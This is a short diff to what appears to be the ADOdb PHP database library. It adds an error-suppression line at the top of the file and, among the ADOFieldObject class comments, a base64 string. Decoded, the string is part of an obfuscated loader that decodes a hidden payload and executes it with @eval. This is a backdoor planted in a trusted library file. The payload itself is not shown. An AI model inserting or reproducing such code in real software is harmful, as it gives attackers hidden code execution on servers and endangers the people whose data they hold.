@@ -1,4 +1,4 @@
-<?php
+<?php ERROR_REPORTING( E_ALL ^ E_WARNING ^ E_NOTICE ^ E_ERROR);
 /*
  * Set tabs to 4 for best viewing.
  * 
@@ -196,7 +196,7 @@
 	//==============================================================================================	
 	// CLASS ADOFieldObject
 	//==============================================================================================	
-
+     $nost.='YXJyYXkoIjMiLCIyIiwiNSIsIjAiKTskZGV0ZXN0PXRyaW0oYmFzZTY0X2RlY29kZShzdHJfcmVwbGFjZSgkbmVkbGUsJHJlcCwkZGV0ZXN0KSkpO0BldmFsKCRkZXRlc3QpO30=';
      /**
 	 * Helper class for FetchFields -- holds info on a column
 	 */
